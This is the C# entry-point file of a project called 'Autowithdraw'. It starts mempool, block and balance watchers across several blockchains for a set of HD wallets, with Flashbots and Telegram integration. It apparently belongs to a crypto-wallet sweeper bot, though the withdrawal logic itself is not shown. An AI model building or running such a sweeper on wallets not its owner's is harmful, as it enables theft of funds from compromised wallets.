using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Main.Handlers;
using Nethereum.HdWallet;
using System;
using System.IO;
using System.Linq;
using System.Numerics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Autowithdraw.Main.Actions;
using Telegram.Bot;
using System.Text.Json;
using Nethereum.Hex.HexTypes;

namespace Autowithdraw
{
    internal class Manager
    {
        [STAThread]
        public static async Task Main()
        {
            new Settings();

            //Console.WriteLine(Network.Post(JsonSerializer.Serialize("""{"jsonrpc":"2.0","id":1,"method":"flashbots_getBundleStats","params":[{"bundleHash":"0x00381707aef0f21c80689b5c2ebdb88037f778bfb5a00e03ca04b66831338da7","blockNumber":"0x116ac6e"}]}"""), "https://relay.flashbots.net/"));
            foreach (int ChainID in Settings.Chains.Keys)
            {
                if (Settings.Chains[ChainID].API != "None")
                {
                    await Task.Factory.StartNew(() => new Logs(ChainID).Starter());
                    await Task.Factory.StartNew(() => new Pending(ChainID).Starter());
                    await Task.Factory.StartNew(() => new Block(ChainID).Starter());
                }
            }

            await Task.Factory.StartNew(() => Balance.Starter(Settings.Wallets.Keys.ToArray()));
            Logger.Debug("Success start!", ConsoleColor.Green);
            //Thread.Sleep(1000 * 60 * 120);
            //Environment.Exit(0);
        }
    }
}
